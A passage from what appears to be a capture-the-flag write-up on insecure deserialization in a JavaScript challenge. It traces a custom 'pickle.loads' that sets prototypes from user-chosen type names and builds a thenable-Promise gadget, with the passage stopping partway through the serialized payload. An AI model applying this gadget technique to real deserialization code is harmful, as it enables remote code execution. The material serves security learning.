+    <span class="token function">findDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Driver</span><span class="token punctuation">(</span>
+            <span class="token constant">DRIVERS</span><span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">DRIVERS</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>orders<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">async</span> <span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> driver <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">findDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">await</span> driver<span class="token punctuation">.</span><span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>order<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>order<span class="token punctuation">.</span>orderId<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Order</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">cart</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>cart <span class="token operator">=</span> cart<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>driver <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orderId <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>cart<span class="token punctuation">.</span>shoppingCartId<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">ShoppingCart</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>items <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>address <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>shoppingCartId <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000000000000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">addItem</span><span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> item<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">removeItem</span><span class="token punctuation">(</span><span class="token parameter">key</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">delete</span> <span class="token keyword">this</span><span class="token punctuation">.</span>items<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Item</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>price <span class="token operator">=</span> price<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">setQuantity</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>quantity <span class="token operator">=</span> num<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Address</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">street<span class="token punctuation">,</span> number<span class="token punctuation">,</span> zip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>street <span class="token operator">=</span> street<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">=</span> number<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>zip <span class="token operator">=</span> zip<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>First, <code>sendOrder</code> is called, and our input(<code>value</code>) is parsed as JSON and then deserialized by <code>pickle.loads</code>.</p>
+<p>Then, a new DeliveryService is created and <code>delivery.sendOrder</code> is called.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">const</span> <span class="token function-variable function">sendOrder</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">value<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> delivery <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DeliveryService</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Order</span><span class="token punctuation">(</span>
+        pickle<span class="token punctuation">.</span><span class="token function">loads</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+    <span class="token punctuation">)</span><span class="token punctuation">,</span> orders<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> delivery<span class="token punctuation">.</span><span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In <code>DeliveryService.sendOrder</code>, there will be a random driver to send your order, and return <code>this.order.orderId</code>.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DeliveryService</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">order<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>order <span class="token operator">=</span> order<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orders <span class="token operator">=</span> orders<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token function">findDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Driver</span><span class="token punctuation">(</span>
+            <span class="token constant">DRIVERS</span><span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">DRIVERS</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>orders<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">async</span> <span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">const</span> driver <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">findDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">await</span> driver<span class="token punctuation">.</span><span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>order<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>order<span class="token punctuation">.</span>orderId<span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In <code>Driver.sendOrder</code>, the driver is assigned to the order, and <code>pickle.dumps(order)</code> is pushed to <code>this.orders</code>, which returns to the user and shows on the <code>/order</code> page in the end.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">Driver</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orders <span class="token operator">=</span> orders<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">async</span> <span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token parameter">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        order<span class="token punctuation">.</span>driver <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> pickledOrder <span class="token operator">=</span> pickle<span class="token punctuation">.</span><span class="token function">dumps</span><span class="token punctuation">(</span>order<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>orders<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>pickledOrder<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2><span id="how-does-deserialization-works">How does deserialization works?</span></h2><p>In JavaScript, class instance is just an object whose constructor points to the class and <code>__proto__</code> points to the prototype of the class.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> num
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">typeof</span> obj<span class="token punctuation">)</span> <span class="token comment">// object</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> <span class="token constant">A</span><span class="token punctuation">)</span> <span class="token comment">// true</span>
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>__proto__ <span class="token operator">===</span> <span class="token class-name">A</span><span class="token punctuation">.</span>prototype<span class="token punctuation">)</span> <span class="token comment">// true</span>
+obj<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>So, it’s easy to create an instance of <code>A</code> without <code>new</code> operator:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>num <span class="token operator">=</span> num
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>num<span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token literal-property property">num</span><span class="token operator">:</span> <span class="token number">123</span>
+<span class="token punctuation">&#125;</span>
+obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">A</span><span class="token punctuation">.</span>prototype
+obj<span class="token punctuation">.</span><span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 123</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>It’s basically what <code>pickle.loads</code> does, recreate the object and assign the correct prototype according to the <code>type</code> key.</p>
+<h2><span id="trying-to-mess-up-prototype">Trying to mess up prototype</span></h2><p>After understanding how it works, my first thought is to mess up the prototype chain to achieve something unexpected.</p>
+<p>This part is the most suspicious, in my opinion:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">const</span> pickle <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+  <span class="token constant">PRIMITIVES</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'String'</span><span class="token punctuation">,</span> <span class="token string">'Number'</span><span class="token punctuation">,</span> <span class="token string">'Boolean'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
+  <span class="token function-variable function">loads</span><span class="token operator">:</span> <span class="token parameter">json</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token punctuation">&#123;</span>key<span class="token punctuation">,</span> type<span class="token punctuation">,</span> value<span class="token punctuation">&#125;</span> <span class="token keyword">of</span> json<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^pickled</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> pickle<span class="token punctuation">.</span><span class="token function">loads</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> constructor <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^pickled</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token operator">||</span>module<span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">globalThis</span><span class="token punctuation">[</span>type<span class="token punctuation">]</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+    <span class="token keyword">return</span> obj<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The first thing I noticed is that I can create a function if the type is <code>Function</code>, because <code>globalThis[&#39;Function&#39;]</code> is a function constructor.</p>
+<p>If I can find a way to run the function, I can get an RCE in the sandbox and manipulate the orders. But I can’t find one at the moment.</p>
+<p>The second thing I tried is to let <code>key</code> equals to <code>__proto__</code>, so that I can control <code>obj.__proto__.__proto__</code> which is <code>Object.prototype.__proto__</code>, the prototype of <code>Object.prototype</code>.</p>
+<p>But this does not work because it’s not allowed. You will get an error like this:</p>
+<blockquote>
+<p>TypeError: Immutable prototype object ‘#&lt;Object&gt;’ cannot have their prototype set</p>
+</blockquote>
+<p>The third thing I came up with is “prototype confusion”, look at this part:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>type<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^pickled</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> pickle<span class="token punctuation">.</span><span class="token function">loads</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">const</span> constructor <span class="token operator">=</span> type<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^pickled</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  obj<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token punctuation">(</span>globalThis<span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token operator">||</span>module<span class="token punctuation">[</span>constructor<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>prototype<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>pickle.loads</code> always returns an object, so <code>obj[key]</code> is an object. But, if the type is <code>pickledString</code>, its prototype will be <code>String.prototype</code>.</p>
+<p>So, we can have a weird object whose prototype is <code>String</code>. We messed up the prototype! But, unfortunately, it’s useless in this challenge.</p>
+<p>After playing around with the pickle function for hours and finding nothing useful, I decided to take a step back.</p>
+<h2><span id="the-essence-of-insecure-deserialization">The essence of insecure deserialization</span></h2><p>The most suspicious part of the challenge is the <code>pickle</code> function, which is responsible for deserializing data. So, I assumed it’s a challenge about insecure deserialization.</p>
+<p>What is the essence of insecure deserialization? Or put it in another way, what makes deserialization “insecure”?</p>
+<p>My answer is: “unexpected object” and “magic function”. </p>
+<p>For example, when we do the deserialization in the application, it usually is to load our data. The reason why deserialization is a vulnerability is that it can be exploited by loading “unexpected object”, like <a target="_blank" rel="noopener" href="https://github.com/ambionics/phpggc">common gadgets</a> in popular libraries.</p>
+<p>Also, the “magic function” is important in PHP, like <code>__wakeup</code>, <code>__destruct</code> or <code>__toString</code> and so on. Those magic functions can help the attacker to find the gadget.</p>
+<p>Back to the challenge, it’s written in JavaScript, what are the magic functions in JavaScript?</p>
+<ol>
+<li><code>toString</code></li>
+<li><code>valueOf</code></li>
+<li><code>toJSON</code></li>
+</ol>
+<p>So, based on this new mindset, I rechecked the code to see if I could find somewhere interesting.</p>
+<p>Although none of the functions has been called on our deserialized object, I did find an interesting place:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">DeliveryService</span> <span class="token punctuation">&#123;</span>
+  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">order<span class="token punctuation">,</span> orders</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>order <span class="token operator">=</span> order<span class="token punctuation">;</span>
+    <span class="token keyword">this</span><span class="token punctuation">.</span>orders <span class="token operator">=</span> orders<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token function">findDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">Driver</span><span class="token punctuation">(</span>
+      <span class="token constant">DRIVERS</span><span class="token punctuation">[</span>Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token constant">DRIVERS</span><span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>orders<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">async</span> <span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> driver <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">findDriver</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">await</span> driver<span class="token punctuation">.</span><span class="token function">sendOrder</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>order<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>order<span class="token punctuation">.</span>orderId<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Look at the <code>sendOrder</code> function, it’s an <code>async</code> function and it returns <code>this.order.orderId</code>. It means that if <code>this.order.orderId</code> is a <code>Promise</code>, it will be resolved, even without <code>await</code>.</p>
+<p><code>Promise.then</code> is another magic function.</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> p <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token parameter">resolve</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span>
+    <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+  <span class="token keyword">return</span> p
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Paste it to the browser console and run, you will see <code>hello</code> printed in the console.</p>
+<p>It’s easy to build a serialized <code>Promise</code>, we only need a <code>then</code> function:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token function-variable function">then</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span>
+      <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token comment">// we don't even need this actually</span>
+  obj<span class="token punctuation">.</span>__proto__ <span class="token operator">=</span> <span class="token class-name">Promise</span><span class="token punctuation">.</span>prototype
+  <span class="token keyword">return</span> obj
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// we don't need await here</span>
+<span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The serialized object looks like this:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
+  <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"shoppingCartId"</span><span class="token punctuation">,</span>
+  <span class="token string-property property">"type"</span><span class="token operator">:</span><span class="token string">"pickledPromise"</span><span class="token punctuation">,</span>
+  <span class="token string-property property">"value"</span><span class="token operator">:</span><span class="token punctuation">[</span>
+    <span class="token punctuation">&#123;</span>
+      <span class="token string-property property">"key"</span><span class="token operator">:</span><span class="token string">"then"</span><span class="token punctuation">,</span>
